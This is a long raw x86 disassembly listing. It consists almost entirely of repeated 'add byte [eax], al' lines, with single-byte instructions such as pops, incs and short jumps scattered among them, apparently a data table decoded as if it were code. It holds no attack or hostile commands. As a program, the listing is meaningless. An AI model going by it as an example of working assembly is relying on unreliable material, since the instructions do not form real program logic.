pop edx
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ecx], ah
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
bound eax, qword [eax]
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
arpl word [eax], ax
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte fs:[eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebp], ah
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [edi], ah
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
imul eax, dword [eax], 0
add byte [eax], al
add byte [eax], al
add byte [eax], al
push 0
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
imul eax, dword [eax], 0
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax + eax], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebp], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
outsb dx, byte [esi]
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [edi], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
jo 0x809c8fa
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
jno 0x809c906
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
jb 0x809c912
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
jae 0x809c91e
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
je 0x809c92a
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
jne 0x809c936
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
jbe 0x809c942
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
ja 0x809c94e
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
js 0x809c95a
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
jns 0x809c966
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
jp 0x809c972
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
inc ecx
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [edx], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
inc ebx
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax + eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebp], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
inc esi
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [edi], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
dec eax
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ecx], cl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
dec edx
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebx], cl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
dec esp
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebp], cl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
dec esi
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [edi], cl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
push eax
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ecx], dl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
push edx
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebx], dl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
push esp
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebp], dl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
push esi
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [edi], dl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
pop eax
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ecx], bl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
pop edx
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ecx], ah
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
bound eax, qword [eax]
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
arpl word [eax], ax
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte fs:[eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebp], ah
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [edi], ah
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
push 0
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ecx], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
push 0
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
imul eax, dword [eax], 0
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax + eax], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebp], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
outsb dx, byte [esi]
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [edi], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
jo 0x809cb6a
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
jno 0x809cb76
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
jb 0x809cb82
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
jae 0x809cb8e
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
je 0x809cb9a
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
jne 0x809cba6
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
jbe 0x809cbb2
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
ja 0x809cbbe
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
js 0x809cbca
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
jns 0x809cbd6
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
jp 0x809cbe2
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
inc ecx
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebx], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
inc esp
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [edi], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
dec edx
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebx], cl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
dec esi
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [edi], cl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
push eax
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ecx], dl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
push ebx
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax + eax], dl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebp], dl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
push esi
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [edi], dl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
pop eax
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ecx], bl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
pop edx
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ecx], ah
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
bound eax, qword [eax]
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
arpl word [eax], ax
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte fs:[eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [esi], ah
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
push 0
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ecx], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
push 0
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
imul eax, dword [eax], 0
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebp], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
outsb dx, byte [esi]
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], dh
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
jno 0x809cd56
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
jb 0x809cd62
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
jae 0x809cd6e
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
je 0x809cd7a
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
jne 0x809cd86
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
jbe 0x809cd92
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
ja 0x809cd9e
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
js 0x809cdaa
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
jns 0x809cdb6
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
jp 0x809cdc2
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
inc ecx
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [edx], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
inc ebx
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax + eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebp], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
inc esi
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [edi], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
dec eax
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ecx], cl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
dec edx
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebx], cl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
dec esp
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebp], cl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
dec esi
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [edi], cl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
push eax
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ecx], dl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
push edx
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebx], dl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
push esp
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebp], dl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
push esi
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [edi], dl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
pop eax
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ecx], bl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
pop edx
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ecx], ah
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
bound eax, qword [eax]
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
arpl word [eax], ax
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte fs:[eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebp], ah
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [edi], ah
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
push 0
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ecx], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
push 0
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
imul eax, dword [eax], 0
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax + eax], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebp], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
outsb dx, byte [esi]
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [edi], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
jo 0x809cfba
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
jno 0x809cfc6
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
jb 0x809cfd2
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
jae 0x809cfde
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
je 0x809cfea
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
jne 0x809cff6
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
jbe 0x809d002
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
ja 0x809d00e
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
js 0x809d01a
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
jns 0x809d026
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
jp 0x809d032
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
inc ecx
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [edx], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
inc esp
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebp], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
inc esi
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [edi], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
dec edx
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebx], cl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
dec esp
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebp], cl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
dec esi
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [edi], cl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
push eax
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ecx], dl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
push ebx
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax + eax], dl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebp], dl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
push esi
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [edi], dl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
pop eax
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ecx], bl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
popal
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [edx], ah
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
arpl word [eax], ax
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte fs:[eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebp], ah
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [edi], ah
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
push 0
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ecx], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
push 0
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
imul eax, dword [eax], 0
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax + eax], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebp], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
outsb dx, byte [esi]
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [edi], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
jo 0x809d1ee
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
jno 0x809d1fa
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
jb 0x809d206
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
jae 0x809d212
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
je 0x809d21e
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
jne 0x809d22a
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
jbe 0x809d236
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
ja 0x809d242
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
js 0x809d24e
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
jns 0x809d25a
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
jp 0x809d266
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
inc ecx
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [edx], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
inc esp
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebp], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
inc esi
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [edi], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
dec ecx
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [edx], cl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
dec ebx
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax + eax], cl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebp], cl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
dec edi
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebx], dl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
push esp
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebp], dl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
push esi
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [edi], dl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
pop eax
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ecx], bl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
popal
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [edx], ah
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
arpl word [eax], ax
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte fs:[eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebp], ah
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [edi], ah
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
push 0
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ecx], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
push 0
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
imul eax, dword [eax], 0
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax + eax], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebp], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
outsb dx, byte [esi]
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [edi], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
jo 0x809d40a
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
jno 0x809d416
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
jb 0x809d422
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
jae 0x809d42e
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
je 0x809d43a
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
jne 0x809d446
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
jbe 0x809d452
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
ja 0x809d45e
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
js 0x809d46a
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
jns 0x809d476
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
jp 0x809d482
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
inc ecx
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [edx], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
inc ebx
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax + eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebp], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
inc esi
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [edi], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
dec eax
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ecx], cl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
dec edx
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebx], cl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
dec esp
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebp], cl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
dec esi
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [edi], cl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
push eax
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ecx], dl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
push edx
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebx], dl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
push esp
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebp], dl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
push esi
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [edi], dl
add byte [eax], al
